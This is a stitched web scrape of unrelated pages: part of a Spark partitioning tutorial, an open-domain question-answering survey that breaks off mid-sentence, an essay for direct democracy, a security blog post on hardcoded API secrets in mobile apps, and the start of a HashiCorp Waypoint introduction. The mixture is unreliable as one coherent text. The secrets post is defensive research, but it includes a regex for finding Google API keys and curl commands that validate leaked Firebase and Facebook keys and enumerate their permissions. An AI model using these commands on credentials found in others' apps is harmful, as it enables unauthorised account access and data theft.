<p>Among its advantages, the DAG allows for a better fault-tolerance of your application as we can recover the lost RDDs by looking up the graph.</p>

<p>But wait, we mentioned <strong>stages</strong> and <strong>tasks</strong>, but concretely, what are these ?</p>

<h3 id="stages">Stages</h3>

<p>Basically, one stage is a set of operation that does not involve a shuffle of data. As soon as a shuffle of data is needed, (when a wide transformation is performed), the DAG will yield a new stage.</p>

<center>
<figure><img src="https://naifmehanna.com/assets/img/stages.png"><center><figcaption>Stages</figcaption></center></figure>

</center>

<h3 id="tasks">Tasks</h3>

<p>A task is generated for each action performed on a partition. We can only have as many tasks running in parallel as cores we have. 
That’s all we need to know about Spark tasks for now !</p>

<h2 id="spark-partitions">Spark partitions</h2>

<p>Since we now know that Spark’s DataFrames and Datasets are both based on RDDs, our explanations will only focus on the latter.</p>

<h4 id="what-are-partitions-concretely-">What are partitions concretely ?</h4>

<p>Partitions are chunks of your original (huge) dataset which are distributed over different nodes. Basically, RDDs are a collection of multiple partitions. 
These partitions are quite easily customizable in number and in their constitution, as we will later see. <br>
By default, when an HDFS file is read, Spark creates a logical partition for every 64 MB of data but this number can be easily modified by forcing it when parallelizing your objects or by repartitioning an existing RDD, by calling the <em>.repartition()</em> or <em>.coalesce()</em> methods.</p>

<p>The <em>.repartition()</em> leads to a full shuffle of data between the executors, leading to aggressive network traffic in order to divide the data into the specified number of partitions. <br>
The <em>.coalesce()</em> operation is more optimized when it reduces the number of partitions, as it doesn’t trigger a full shuffle, but only a transfer of the data from partitions being removed to existing partitions.</p>

<p>Efficiently partitioning your data is important as a good partitioning can lead to huge speed improvement and fewer OOMs errors. This statement is even more true when your data is key-value oriented.</p>

<h4 id="how-does-rdds-become-key-value-oriented-">How does RDDs become key-value oriented ?</h4>

<p>The key-value paradigm is essential in efficient parallel data processing. Spark provides full implementation of key-value based RDD in the <em>PairRDD</em> and the <em>PairRDDFUnctions</em> classes. These classes are made available through implicit conversion, meaning that you only have to create a regular RDD of a tuple (in scala), such as RDD[(key, value)], in order to be able to take advantages of its methods. Spark also provides the <em>OrderedRDD</em> and <em>OrderedRDDFunctions</em> classes for key-value oriented RDDs for which the key is ordered. (Note that the key must either have an implicit ordering defined, or you should define your implicit ordering function).<br>
Needless to say that in order to exploit the full advantages of Spark parallelism, the partition must be created smartly, especially when we’re dealing with key-value RDDs. 
The partitioning will define how most wide transformations scale up as they mostly are key-value transformations.</p>

<h4 id="what-are-the-considerations-to-have-when-dealing-with-key-value-pairs-">What are the considerations to have when dealing with key-value pairs ?</h4>

<p>Dealing with key-value pairs should be well thought, before even starting to code as they can lead to numerous bottlenecks:</p>
<ul>
  <li>The most frequent cause of OOMs errors comes from ineficient use of key-value partitioning, either on the driver, or on the executors. For instance, a <em>.countByKey()</em> operation on a huge number of keys may lead to OOMs exceptions on the driver, while actions performed on partition belonging to keys with too much entries may lead to OOMs on the executors.</li>
  <li>Bottlenecks tasks which slow down the whole job. They happen when the dataset is very unbalanced.</li>
  <li>Shuffle failure, which are caused by wide transformation weighing on the network traffic (shuffle read/write too high).</li>
</ul>

<h4 id="can-these-problems-be-adressed-through-a-good-partitioning-">Can these problems be adressed through a good partitioning ?</h4>

<p>Totally. Well, mostly. A smart partitioning can lead to less shuffle, and a smaller toll on the executor’s memory.<br>
Also, a good architecture is essential in order to perform your actions in a smart way.</p>

<p>A model that can answer any question with regard to factual knowledge can lead to many useful and practical applications, such as working as a chatbot or an AI assistant🤖. In this post, we will review several common approaches for building such an open-domain question answering system.</p>

<p>Disclaimers given so many papers in the wild:</p>
<ul>
  <li>Assume we have access to a powerful pretrained <a href="https://lilianweng.github.io/lil-log/2019/01/31/generalized-language-models.html">language model</a>.</li>
  <li>We do not cover how to use structured knowledge base (e.g. Freebase, WikiData) here.</li>
  <li>We only focus on a single-turn QA instead of a multi-turn conversation style QA.</li>
  <li>We mostly focus on QA models that contain neural networks, specially Transformer-based language models.</li>
  <li>I admit that I missed a lot of papers with architectures designed specifically for QA tasks between 2017-2019😔</li>
</ul>



<h2 id="what-is-open-domain-question-answering">What is Open-Domain Question Answering?</h2>

<p><strong>Open-domain Question Answering (ODQA)</strong> is a type of language tasks, asking a model to produce answers to factoid questions in natural language. The true answer is objective, so it is simple to evaluate model performance.</p>

<p>For example,</p>
<div><div><pre><code>Question: What did Albert Einstein win the Nobel Prize for?
Answer: The law of the photoelectric effect.
</code></pre></div></div>

<p>The “open-domain” part refers to the lack of the relevant context for any arbitrarily asked factual question. In the above case, the model only takes as the input the question but no article about “why Einstein didn’t win a Nobel Prize for the theory of relativity” is provided, where the term “the law of the photoelectric effect” is likely mentioned. In the case when both the question and the context are provided, the task is known as <strong>Reading comprehension (RC)</strong>.</p>

<p>An ODQA model may work with or without <em>access to an external source of knowledge</em> (e.g. Wikipedia) and these two conditions are referred to as <em>open-book</em> or <em>closed-book</em> question answering, respectively.</p>

<p>When considering different types of open-domain questions, I like the classification by <a href="https://arxiv.org/abs/2008.02637">Lewis, et al., 2020</a>, in increasing order of difficulty:</p>
<ol>
  <li>A model is able to correctly memorize and respond with the answer to a question that has been seen at training time.</li>
  <li>A model is able to answer novel questions at test time and choose an answer from the set of answers it has seen during training.</li>
  <li>A model is able to answer novel questions which have answers not contained in the training dataset.</li>
</ol>

<p><img src="https://lilianweng.github.io/lil-log/assets/images/QA-summary.png" alt="QA-summary"></p>
<p><em>Fig. 1. Overview of three frameworks discussed in this post.</em></p>

<h3 id="notation">Notation</h3>

<p>Given a question \(x\) and a ground truth answer span \(y\), the context passage containing the true answer is labelled as \(z \in \mathcal{Z}\), where \(\mathcal{Z}\) is an external knowledge corpus. Wikipedia is a common choice for such an external knowledge source.</p>

<h3 id="concerns-of-qa-data-fine-tuning">Concerns of QA data fine-tuning</h3>

<p>Before we dive into the details of many models below. I would like to point out one concern of fine-tuning a model with common QA datasets, which appears as one fine-tuning step in several ODQA models. It could be concerning, because there is a significant overlap between questions in the train and test sets in several public QA datasets.</p>

<p><a href="https://arxiv.org/abs/2008.02637">Lewis, et al., (2020)</a> (<a href="https://github.com/facebookresearch/QA-Overlap">code</a>) found that 58-71% of test-time answers are also present somewhere in the training sets and 28-34% of test-set questions have a near-duplicate paraphrase in their corresponding training sets. In their experiments, several models performed notably worse when duplicated or paraphrased questions were removed from the training set.</p>

<h2 id="open-book-qa-retriever-reader">Open-book QA: Retriever-Reader</h2>

<p>Given a factoid question, if a language model has no context or is not big enough to memorize the context which exists in the training dataset, it is unlikely to guess the correct answer. In an open-book exam, students are allowed to refer to external resources like notes and books while answering test questions. Similarly, a ODQA system can be paired with a rich knowledge base to identify relevant documents as evidence of answers.</p>

<p>We can decompose the process of finding answers to given questions into two stages,</p>
<ol>
  <li>Find the related context in an external repository of knowledge;</li>
  <li>Process the retrieved context to <em>extract</em> an answer.</li>
</ol>

<p><img src="https://lilianweng.github.io/lil-log/assets/images/QA-retriever-reader.png" alt="retriever + reader QA system"></p>
<p><em>Fig. 2. The retriever-reader QA framework combines information retrieval with machine reading comprehension.</em></p>

<p>Such a retriever + reader framework was first proposed in <strong>DrQA</strong> (“Document retriever Question-Answering” by <a href="https://arxiv.org/abs/1704.00051">Chen et al., 2017</a>; <a href="https://github.com/facebookresearch/DrQA">code</a>). The retriever and the reader components can be set up and trained independently, or jointly trained <a href="#end-to-end-joint-training">end-to-end</a>.</p>

<h3 id="retriever-model">Retriever Model</h3>

<p>Two popular approaches for implementing the retriever is to use the information retrieval (IR) system that depends on (1) the classic non-learning-based <a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf">TF-IDF</a> features (“classic IR”) or (2) dense embedding vectors of text produced by neural networks (“neural IR”).</p>

<h4 id="classic-ir">Classic IR</h4>

<p><strong>DrQA</strong> (<a href="https://arxiv.org/abs/1704.00051">Chen et al., 2017</a>) adopts an efficient non-learning-based search engine based on the <a href="https://en.wikipedia.org/wiki/Vector_space_model">vector space model</a>. Every query and document is modelled as a bag-of-word vector, where each term is weighted by TF-IDF (term frequency \(\times\) inverse document frequency).</p><p>

\[\begin{aligned}
\text{tf-idf}(t, d, \mathcal{D}) &amp;= \text{tf}(t, d) \times \text{idf}(t, \mathcal{D}) \\
\text{tf}(t, d) &amp;= \log(1 + \text{freq}(t, d)) \\
\text{idf}(t, \mathcal{D}) &amp;= \log \Big( \frac{\vert\mathcal{D}\vert}{\vert d\in\mathcal{D}: t\in d\vert} \Big)
\end{aligned}\]

</p><p>where \(t\) is a unigram or bigram term in a document \(d\) from a collection of documents \(\mathcal{D}\) . \(\text{freq}(t, d)\) measures how many times a term \(t\) appears in \(d\). Note that the term-frequency here includes bigram counts too, which is found to be very helpful because the local word order is taken into consideration via bigrams. As part of the implementation, DrQA maps the bigrams of \(2^{24}\) bins using unsigned murmur3 hash.</p>

<p>Precisely, DrQA implemented Wikipedia as its knowledge source and this choice has became a default setting for many ODQA studies since then. The non-ML document retriever returns the top \(k=5\) most relevant Wikipedia articles given a question.</p>

<p><strong>BERTserini</strong> (<a href="https://arxiv.org/abs/1902.01718">Yang et al., 2019</a>) pairs the open-source <a href="https://github.com/castorini/anserini"><em>Anserini</em></a> IR toolkit as the retriever with a fine-tuned pre-trained BERT model as the reader. The top \(k\) documents (\(k=10\)) are retrieved via the <code>post-v3.0</code> branch of Anserini with the query treated as a bag of words. The retrieved text segments are ranked by <a href="https://en.wikipedia.org/wiki/Okapi_BM25">BM25</a>, a classic TF-IDF-based retrieval scoring function. In terms of the effect of text granularity on performance, they found that paragraph retrieval &gt; sentence retrieval &gt; article retrieval.</p>

<p><em>ElasticSearch + BM25</em> is used by the <strong>Multi-passage BERT</strong> QA model (<a href="https://arxiv.org/abs/1908.08167">Wang et al., 2019</a>). They found that splitting articles into passages with the length of 100 words by <em>sliding window</em> brings 4% improvements, since splitting documents into passages without overlap may cause some near-boundary evidence to lose useful contexts.</p>

<h4 id="neural-ir">Neural IR</h4>

<p>There is a long history in learning a low-dimensional representation of text, denser than raw term-based vectors (<a href="http://lsa.colorado.edu/papers/JASIS.lsi.90.pdf">Deerwester et al., 1990</a>; <a href="https://www.aclweb.org/anthology/W11-0329/">Yih, et al., 2011</a>). Dense representations can be learned through matrix decomposition or some neural network architectures (e.g. MLP, LSTM, bidirectional LSTM, etc). When involving neural networks, such approaches are referred to as “Neural IR”, Neural IR is a new category of methods for retrieval problems, but it is not necessary to perform better/superior than classic IR (<a href="https://sigir.org/wp-content/uploads/2019/01/p040.pdf">Lim, 2018</a>).</p>

<p>After the success of many large-scale <a href="https://lilianweng.github.io/lil-log/2019/01/31/generalized-language-models.html">general language models</a>, many QA models embrace the following approach:</p><p>

\[h_x = E_x(x)\quad
h_z = E_z(z)\quad
\text{score}(x, z) = h_x^\top h_z\]

</p><ol>
  <li>Extract the dense representations of a question \(x\) and a context passage \(z\) by feeding them into a language model;</li>
  <li>Use the dot-product of these two representations as the retrieval score to rank and select most relevant passages.</li>
</ol>

<p>ORQA, REALM and DPR all use such a scoring function for context retrieval, which will be described in detail in a <a href="#end-to-end-joint-training">later section</a> on the end-to-end QA model.</p>

<p>An extreme approach, investigated by <strong>DenSPI</strong> (“Dense-Sparse Phrase Index”; <a href="https://arxiv.org/abs/1906.05807">Seo et al., 2019</a>), is to encode all the text in the knowledge corpus at the <em>phrase</em> level and then only rely on the retriever to identify the most relevant phrase as the predicted answer. In this way, the retriever+reader pipeline is reduced to only retriever. Of course, the index would be much larger and the retrieval problem is more challenging.</p>

<p>DenSPI introduces a <em>query-agnostic</em> indexable representation of document phrases. Precisely it encodes query-agnostic representations of text spans in Wikipedia offline and looks for the answer at inference time by performing nearest neighbor search. It can drastically speed up the inference time, because there is no need to re-encode documents for every new query, which is often required by a reader model.</p>

<p>Given a question \(x\) and a fixed set of (Wikipedia) documents, \(z_1, \dots, z_K\) and each document \(z_k\) contains \(N_k\) words, \(z_k = \langle z_k^{(1)}, \dots, z_k^{(N_k)}\rangle\). An ODQA model is a scoring function \(F\) for each candidate phrase span \(z_k^{(i:j)}, 1 \leq i \leq j \leq N_k\), such that the truth answer is the phrase with maximum score: \(y = {\arg\max}_{k,i,j} F(x, z_k^{(i:j)})\).</p>

<p>The phrase representation \(z_k^{(i:j)}\) combines both dense and sparse vectors, \(z_k^{(i:j)} = [d_k^{(i:j)}, s_k^{(i:j)}] \in \mathbb{R}^{d^d + d^s}\) (note that \(d^d \ll d^s\)):</p>
<ul>
  <li>The dense vector \(d_k^{(i:j)}\) is effective for encoding local <em>syntactic</em> and <em>semantic</em> cues, as what can be learned by a pretrained language model.</li>
  <li>The sparse vector \(s_k^{(i:j)}\) is superior at …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            <p>There is—thankfully—<a href="https://www.ft.com/content/53fc1c4a-7ca3-4406-b9db-bebf1af9c9b8">consid</a><a href="https://quillette.com/2020/08/01/twilight-of-democracy-a-review/">erable</a> <a href="https://www.thetimes.co.uk/article/chinas-young-watch-trump-and-breathe-a-sigh-of-relief-they-dont-have-democracy-r7bc3g2wf">collo</a><a href="https://press.princeton.edu/books/hardcover/9780691169446/democracy-for-realists)">quy</a> on the quality of our world’s democracies. People talk about whether democracy is actually a good idea while others claim it’s just the <a href="https://www.sundayguardianlive.com/opinion/democracy-mercy-public-opinion">least worse</a>. In this text I will attempt to convince you that democracy is not only a good idea, but actually a great one. All this with a transcendental shift in our perception of democracy:</p>
<p>Democracy is not a system; it is an achievement.</p>
<h2>Unsystemacy</h2>
<p>We can’t have democracy if we do not <em>think</em> in democratic principles. It’s like agile when developing software. You can’t switch to agile by adding a standup and a retro—it’s not a recipe<sup id="fnref:agile"><a href="#fn:agile">1</a></sup>. You can only be agile if you have the <a href="https://agilemanifesto.org/">agile mindset</a>. In the same way, you can’t be a democracy just by having your leaders elected<sup id="fnref:elected"><a href="#fn:elected">2</a></sup>. You can only have democracy if you include everyone in the actual decision making processes. When venturing democracy, there is a constant need for self-reflection on whether everyone is actually involved. This requires a continuous, active examination of societal processes, an everlasting reworking of the methods of decision making. That's core to the democratic mindset.</p>
<h2>Recipe status</h2>
<p>It's evident in the global society that we view democracy as a set of rules that once applied, all societal desires will be aligned and non-zero sum benefits will unequivocally emerge. One piece of this evidence is the common remark: <em>democracy has failed us</em>; or: <em>democracy doesn’t work</em>. But that’s not the case. There is a limit to the range of influence of any <a href="https://en.wikipedia.org/wiki/Structure_and_agency">social structure</a>. Nothing will force all our interests to be aligned—only our <a href="https://en.wikipedia.org/wiki/Agency_(sociology)">agency</a>. If not this, then what's left is searching for loopholes in extraneously established laws with the purpose of making one’s life easier at the expense of the whole society's betterment.</p>
<p>That's not to say this is an argument against social structures. On the contrary, it's one in favour. The disparity in this text's thesis is that these structures should be created directly from the people they are designed to apply to, not from a handful of elected officials.</p>
<h2>Against chain of agency</h2>
<p>Democracy, by definition, is when people themselves have the power to make political and societal decisions. It was, historically, the <a href="https://en.wikipedia.org/wiki/Dialectic#Modern_philosophy">dialectic antithesis</a> to oligarchy: when power resides with the few. Indirect, or representative democracy, the current prevalent version of democracy, is not democracy, but rather an oligarchy.</p>
<p>In representative democracy, politician (i.e. one who discusses and decides on societal issues) is a career. Whereas, in democracy, everyone is a politician and is expected to actively engage with any societal issues at hand. That is in addition to their job.</p>
<p>Representative democracy politicians aim to convince people to vote for them via superficially dramatic campaigns, <a href="https://en.wikipedia.org/wiki/Demonstration_(political)">rally</a>-style theatrical performances, and by employing fanfare. There are no real societal plans being discussed<sup id="fnref:ad hominem"><a href="#fn:ad hominem">3</a></sup> between the politicians and the people, just statements and ambiguous responses—approval or rejection—from the public.</p>
<p>However, discussion is a core feature of the democratic framework. How can a team make a collective decision if there is no discussion on the issue? In other words, how can a people make a democratic decision if there are no processes to discuss issues?</p>
<p>Across the whole wide spectrum of actionable politics, in representative democracy a citizen makes, on average, two political decision every four years<sup id="fnref:elections"><a href="#fn:elections">4</a></sup>. As mentioned, achieving democracy means people exert the governing power. Nevertheless, half a political decision per year is not nearly enough for people to be considered actively involved in the decision making process.</p>
<h2>As essence</h2>
<p>Before we argue against the shortcomings of direct democracy, there is a case to be made for the essential quality of democracy as a societal framework<sup id="fnref:system"><a href="#fn:system">5</a></sup>.</p>
<p><em>Proposition 1</em>: People value autonomy more than life itself. Indications are <a href="https://en.wikipedia.org/wiki/Liberty_or_death">spread across history</a>, ranging from the <a href="https://en.wikipedia.org/wiki/Eleftheria_i_thanatos">motto of Greece</a> to the ethos of <a href="https://en.wikipedia.org/wiki/Live_Free_or_Die_(Breaking_Bad)">Breaking Bad</a>.<br>
<em>Proposition 2</em>: Sharing our lives with other people (friends, family, strangers) is part of the essence of our humanity.<br>
<em>Proposition 3</em>: It follows from 1 and 2 that being autonomous together with other people is vital.  </p>
<p>Democracy is the actualisation of this: making collective decisions on how we live. Undoubtedly, fundamental. I would go as far as to say that there is no point in life without this sport of endeavouring democracy. If not for it, our life would be either an autonomous loneliness or an enslaved collectivity.</p>
<h2>In defence of</h2>
<p>Let's assume Fred, our imaginary assistant for the demonstration of the argumentative against the shortcomings of direct democracy.</p>
<blockquote>
<p>Fred: “Well, that’s all nice and stuff, but we can’t have direct democracy because people are not well educated to have opinions on significant matters and/or they will make horrible decisions. See Brexit, for example.”</p>
</blockquote>
<p>Fred, allow me to disagree. For one, there are solid arguments to be made in favour of Brexit, regardless of Brexiteers basing their vote on the silly ones.</p>
<p>It is true that people will be unknowledgeable on a variety of issues that they will be asked to give opinions on. However, during an honest discourse where all voices are given equal ground and are heard in the same level, it is an argument of human rationality and aligned interests that people are going to behave responsibly<sup id="fnref:expectations"><a href="#fn:expectations">6</a></sup>.</p>
<p>Another argument to be made here is that there are, and have been through recent history, multiple political leaders the intelligence of whom is highly questionable. Yet, we survived. Therefore, I have little fear that the consequences of a potential lack of intelligence will be destructive.</p>
<p>Finally, freedom is more important than making the best decision—it’s more important than life itself, for many! Let people decide for themselves, even if it kills them. How much more different would it be from the present, when elected leaders decide for people, and it still kills them<sup id="fnref:police"><a href="#fn:police">7</a></sup>?</p>
<blockquote>
<p>Fred: “So you’re saying instead of Trump ordering the police to kill people, people will accidentally kill themselves and that’s ok. Great stuff! You know what, direct democracy is never going to work because people don’t have time to talk politics all day. Not to mention that many don't even care about politics. They have jobs and are busy with their actual life. Direct democracy was only good when it was invented, when they had slaves to work the fields, in ancient Athens.”</p>
</blockquote>
<p>Come on, Fred, you know the first part is a straw man.</p>
<p>Here's the thing about people's time. All these decisions already <em>are</em> part of their busy life. Politics and societal issues unavoidably affect everyone and the only other path is lack of action—being a puppet while others decide for your life and the civic institutions that eventually you, too, will encounter. Is that not a core part of everyone's life? It seems fundamental to find the time for it.</p>
<p>There are many things to say about all this people's busyness and the concept of bullshit jobs is one of them. The work ethic that is currently permeating the global society is one that associates work with self-worth<sup id="fnref:protestant"><a href="#fn:protestant">8</a></sup>. David Graeber describes <a href="https://en.wikipedia.org/wiki/Bullshit_Jobs">Bullshit Jobs</a> as meaningless jobs that exist only because it's shameful to not work. Hence, we had to invent jobs such as <em>door attendants</em> and <em>airline desk staff who calm passengers whose bags do not arrive</em> to keep up with the demand for <em>virtuous suffering</em>. </p>
<p>In regards to the argument of people not being interested in politics, I see that more of an aftereffect of the complete disaster that modern politics has been<sup id="fnref:modern politics"><a href="#fn:modern politics">9</a></sup>, rather than an inherent characteristic of people not concerned about how they live. Ultimately, many may not care, but at least those who do will have the capacity to act.</p>
<blockquote>
<p>Fred: “Well, you didn’t convince me at all. We have this system for so long now; it's not perfect—nothing is—but it's so much better than all the previous ones. We're not going to make such an inconsiderate change and abandon it for something evidently not working.”</p>
</blockquote>
<p>Today, I learned that up until 2006<sup id="fnref:security"><a href="#fn:security">10</a></sup> one could take <a href="https://en.wikipedia.org/wiki/2006_transatlantic_aircraft_plot">liquids on a plane</a>. It sounds like a magical time, but it was only fourteen years ago. Something so established and familiar didn’t exist until very recently. The point I want to make is that changes seem scary but only from afar. In the end, this world is all about risk taking and <a href="https://en.wikipedia.org/wiki/Heraclitus#Panta_rhei">change</a>.</p>
<p>Another point about radical change is technology. It has evolved enormously during the last twenty years, not to mention the last hundred. Who could ever imagine in 1920, that humanity would be so intimately enmeshed in a global cybernetic network?</p>
<p>Yet, on the other side, how much have our societal and political systems change since then? It’s only fitting that a change of an equivalent radical degree is waiting to happen on how our societies work.</p>

November 2, 2020 | https://blog.ostorlab.co/hardcoded-secrets.html | <a href="https://web.archive.org/web/*/https://blog.ostorlab.co/hardcoded-secrets.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>Hardcoded secret keys are a convenient target to Bug Bounty hunters and Attackers. They are easy to spot and they can
open a wide gate to sensitive data and privileged access.</p>
<p>Hardcoded secrets caused several high profile breaches in the past, notable ones are:</p>
<ul>
<li>
<p><strong>MyCar</strong>: MyCar is a vehicle telematics systems. The maker  left hardcoded credentials inside its Android and iOS
mobile apps. This left tens of thousands of cars vulnerable to hackers, who could locate car, identify them, unlock them,
start the car or trigger the alarm.</p>
</li>
<li>
<p><strong>Uber</strong>: An Uber employee published plaintext credentials within source code that was then posted on Github. 
An attacker found the embedded credentials on GitHub, then used them to gain privileged access on Uber’s Amazon
AWS Instances. The attacker then demanded a 100k$ ransom, that Uber did pay.
 The Uber breach resulted in the exposure of information of 57 million customers, plus roughly 600,000 drivers. Once the
 story became public, Uber paid a settlement of 148M$ and had to delay its IPO.</p>
</li>
<li>
<p><strong>Uniguest</strong>: Uniguest provides kiosks (PC, iMac, tablet) available in hotel lobbies (and other places). User can use
them to run simple tasks, such as browsing the web or printing boarding passes.
The API credentials were hardcoded within the application and were used to dump all the data in the Uniguest
cloud database. The data included admin credentials, router and BIOS passwords, product keys and various other sensitive information.</p>
</li>
</ul>
<p>Hardcoded secrets are also commonly reported by Bug Bounty hunters. If you check any of the different Bug Bounty programs, you will
find many disclosed reports pointing to the hardcoded keys in the <code>AndroidManifest.xml</code>, <code>Info.plist</code> or some resource file. </p>
<p>Depending on the permissions and use of the key, these vulnerabilities might be awarded up to 1k$. The severity ranges from
elevating privileges, accessing sensitive information, over-bill/theft of a service or conducting a denial of service attack.</p>
<h2>How to find and validate secrets?</h2>
<p>Secrets can be found either statically or dynamically. A common static approach is to search known patterns, for instance
searching for strings matching the following regular expression <code>AIza[0-9A-Za-z\\-_]{35}</code>:</p>
<div><pre><span></span><code>$ app8 egrep -r <span>'AIza[0-9A-Za-z\\-_]{35}'</span> . 
Binary file ./resources.arsc correspondant
Binary file ./app.apk correspondant
Binary file ./classes.dex correspondant                                
./assets/google-services-desktop.json:          <span>"current_key"</span>: <span>"AIzaSy....................."</span>
</code></pre></div>
<p>You can find in this repo <a href="https://github.com/l4yton/RegHex">l4yton/RegHex</a> a list of regular expressions to use.</p>
<p>Because not all API keys and secrets are bad or dangerous, and not all pattern outputs are correct; the keys must be checked and the
permissions, roles, scopes, and restrictions (more on that latter) must be enumerated and verified.
<code>streaak</code> published a repo <a href="https://github.com/streaak/keyhacks">streaak/keyhacks</a> listing <code>curl</code> commands to check a wide range of keys.</p>
<p>Below are some examples for Firebase keys and Facebook secrets:</p>
<div><pre><span></span><code>$ curl -s -X POST --header <span>"Authorization: key=AIzaS........."</span> --header <span>"Content-Type:application/json"</span> <span>'https://fcm.googleapis.com/fcm/send'</span> -d <span>'{"registration_ids":["1"]}'</span>
&lt;HTML&gt;
&lt;HEAD&gt;
&lt;TITLE&gt;INVALID_KEY_TYPE&lt;/TITLE&gt;
&lt;/HEAD&gt;
&lt;BODY <span>BGCOLOR</span><span>=</span><span>"#FFFFFF"</span> <span>TEXT</span><span>=</span><span>"#000000"</span>&gt;
&lt;H1&gt;INVALID_KEY_TYPE&lt;/H1&gt;
&lt;H2&gt;Error <span>401</span>&lt;/H2&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre></div>
<div><pre><span></span><code>$ curl https://graph.facebook.com/oauth/access_token<span>\?</span>client_id<span>\=</span>51XXXX<span>\&amp;</span>client_secret<span>\=</span>0cbd4XXXXX<span>\&amp;</span>redirect_uri<span>\=\&amp;</span>grant_type<span>\=</span>client_credentials
<span>{</span><span>"access_token"</span>:<span>"5181XXXXXXXXXXXXXX"</span>,<span>"token_type"</span>:<span>"bearer"</span><span>}</span>% 
</code></pre></div>
<p>Once a key is found, the API documentation should be your best-friend to determine what permissions does it have and what
sort of actions can be performed. Take for instance instance a facebook application, you can then use the <code>https://graph.facebook.com/v8.0/{applicationId}/permissions</code> endpoint to list permissions:</p>
<div><pre><span></span><code>$ curl <span>"https://graph.facebook.com/v8.0/51XXXXXXXX/permissions?access_token=51XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span>
<span>{</span><span>"data"</span>:<span>[{</span><span>"permission"</span>:<span>"email"</span>,<span>"status"</span>:<span>"live"</span><span>}</span>,<span>{</span><span>"permission"</span>:<span>"pages_show_list"</span>,<span>"status"</span>:<span>"live"</span><span>}</span>,<span>{</span><span>"permission"</span>:<span>"pages_messaging"</span>,<span>"status"</span>:<span>"live"</span><span>}</span>,<span>{</span><span>"permission"</span>:<span>"groups_show_list"</span>,<span>"status"</span>:<span>"live"</span><span>}</span>,<span>{</span><span>"permission"</span>:<span>"pages_read_engagement"</span>,<span>"status"</span>:<span>"live"</span><span>}</span>,<span>{</span><span>"permission"</span>:<span>"public_profile"</span>,<span>"status"</span>:<span>"live"</span><span>}]}</span>%   
</code></pre></div>
<p>Another CLI friendly tool is Yelp's <code>detect-secret</code>: <a href="https://github.com/Yelp/detect-secrets">Yelp/detect-secrets</a>.
The tool detects a smaller subset of keys and implements validation for some a well.</p>
<p>Ostorlab automates the process of finding and checking keys and secrets and covers 53 secret types at time this article is written. 
A secret agent collects keys matching patterns or used dynamically by specific APIs or intercepted over the wire. The agent
then checks these keys to confirm if valid by iterating over all known services. </p>
<p>This a screenshot showing an example confirming a valid key and the matching service**.</p>
<p><img alt="Hardcoded secrets" src="https://blog.ostorlab.co/static/img/hardcoded_secret_keys/secret_finding.png" title="Ostorlab's report: Hardcoded Secret"></p>
<p>Just out of the last 10k apps scanned, we have reported over 200 valid secrets granting access to highly sensitive data
or critical services, like Payment or Source Code. Below are some statistics of the number of keys found per service:</p>

<h2>How to fix it?</h2>
<ul>
<li><strong>Embedding is Acceptable, nothing to do here</strong>: Most services provide best practices for how to use the API or secret. Some APIs are acceptable if embedded in an application. Firebase is an example:</li>
</ul>
<div><pre><span></span><code>Unlike how API keys are typically used, API keys for Firebase services are not used to control access to backend resources; 
that can only be done with Firebase Security Rules. 
Usually, you need to fastidiously guard API keys (for example, by using a vault service or setting the keys as environment variables); 
however, API keys for Firebase services are ok to include in code or checked-in config files.
</code></pre></div>
<ul>
<li><strong>Alternatives are encouraged, I should switch</strong>: Some services offer more secure alternatives to embedding credentials (such as Amazon and Google, example from <a href="https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html">AWS recommendation</a>):</li>
</ul>
<div><pre><span></span><code>You have a mobile app. Do not embed access keys with the app, even in encrypted storage. 
Instead, use Amazon Cognito to manage user identities in your app. This service lets you authenticate users using Login with Amazon, Facebook, Google, or any OpenID Connect (OIDC)–compatible identity provider. 
You can then use the Amazon Cognito credentials provider to manage credentials that your app uses to make requests to AWS. For more information, see Using the Amazon Cognito Credentials Provider on the AWS Mobile Blog. 
</code></pre></div>
<ul>
<li><strong>Embedding is Dangerous, delegate the actions to the Server</strong>: For some services, embedding keys is an invitation to get hacked, see for instance <a href="https://stripe.com/docs/keys#safe-keys">Stripe documentation</a>. In these cases, having the server must perform the interaction with the service.</li>
</ul>
<div><pre><span></span><code>Your secret API key can be used to make any API call on behalf of your account, such as creating charges or performing refunds. 
Treat your secret API key as you would any other password. Grant access only to those who need it. 
Ensure it is kept out of any version control system you may be using. 
Control access to your key using a password manager or secrets management service.

In live mode, new secret keys are only visible the first time you access them. 
After that, the Dashboard redacts the API key. When the key is revealed, you can leave a note on the Dashboard describing the location on your own systems where you’ve copied it. 
If you lose your secret key, you can’t recover it from the Dashboard and must roll the key or create another one.
</code></pre></div>
<ul>
<li><strong>Hardening through Remote Key fetching and Key Pinning</strong>: For services that don't provide a per-user authentication service, and
need to be embedded in the application, it’s recommended to retrieve the
key from the server. It is also best practice to restrict the key's permissions (principle of least privilege).
Some service provide the possibility to PIN keys to an application or domain name. Because this 
protection is not perfect, rotating the keys is recommended to limit exposure.</li>
</ul>

  Introduction - HashiCorp Waypoint
</h2>


<p>Yesterday (15 October 2020) HashiCorp launched an open source tool named Waypoint. Let us try to understand the problem statement and see how Waypoint aims to fix those. </p>

<p>HashiCorp Co-Founder and CTO Mitchell Hashimoto very rightly said during the 2020 HashiConf keynote that traditional software developer lifecycle includes different phases: Code, Test, Build, Deploy, Release, Operate and Measure. Out of this list, commonly-accepted tools for Code, Test, Operate and Measure exist, but the three areas of Build, Deploy and Relese have some challenges that Waypoint aims to solve.</p>

<p>Before we get in to the guide,I've also put together a video walkthrough which is well worth checking out...</p>

<iframe width="100%" height="420" src="https://www.youtube.com/embed/_FRiBVY1ZXI" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>On with the guide...</p>

<p>There are build systems that help you build and then deploy to specific platforms, but due to wide variety of platforms out there for application deployment, you will have to use and learn different build/deploy methods specific to the different platforms. The same goes for Release management. Now, in order to have a common workflow with ease of use across all platforms, Hashicorp has introduced <strong>Waypoint</strong>, with the aim of "providing a consistent workflow to build, deploy and release an application to any platform".</p>

<p>From the <a href="https://www.waypointproject.io/docs">docs</a> - "<strong>Waypoint</strong> is a tool that enables developers to describe how to get their applications from development to production in a single file and deploy using a single command: <code>waypoint up</code>".</p>

